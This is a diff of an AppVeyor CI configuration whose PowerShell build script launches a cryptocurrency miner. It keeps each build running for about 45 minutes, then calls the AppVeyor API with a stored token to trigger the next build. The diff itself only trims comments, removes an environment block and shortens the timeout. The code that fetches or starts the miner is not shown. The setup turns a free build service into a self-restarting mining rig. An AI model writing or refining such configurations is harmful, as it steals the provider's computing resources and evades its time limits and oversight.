@@ -1,10 +1,5 @@
 image: Visual Studio 2022
-
 build: off
-
-environment:
-  API_TOKEN:
-    secure: "your_encrypted_api_token_here" # Replace with your encrypted token
 
 install:
   - ps: |
@@ -31,9 +26,8 @@ build_script:
       
       Write-Host "Miner process has been launched. This build will run for 50 minutes before restarting."
       
-      # Timeout set to 50 minutes
       $startTime = Get-Date
-      $timeoutMinutes = 50  # Corrected to 50 minutes as intended
+      $timeoutMinutes = 45
       
       while (((Get-Date) - $startTime).TotalMinutes -lt $timeoutMinutes) {
           Start-Sleep -Seconds 300
@@ -47,8 +41,7 @@ on_finish:
       Write-Host "Build finished. Attempting to trigger the next build via API..."
       
       $accountName = "Peter211231231231232131"
-      $projectSlug = "voyage-test"  # This is correct based on your successful test
-      # The 'branch' parameter is optional and can be omitted
+      $projectSlug = "voyage-test"
       
       try {
           if (-not $env:API_TOKEN) {
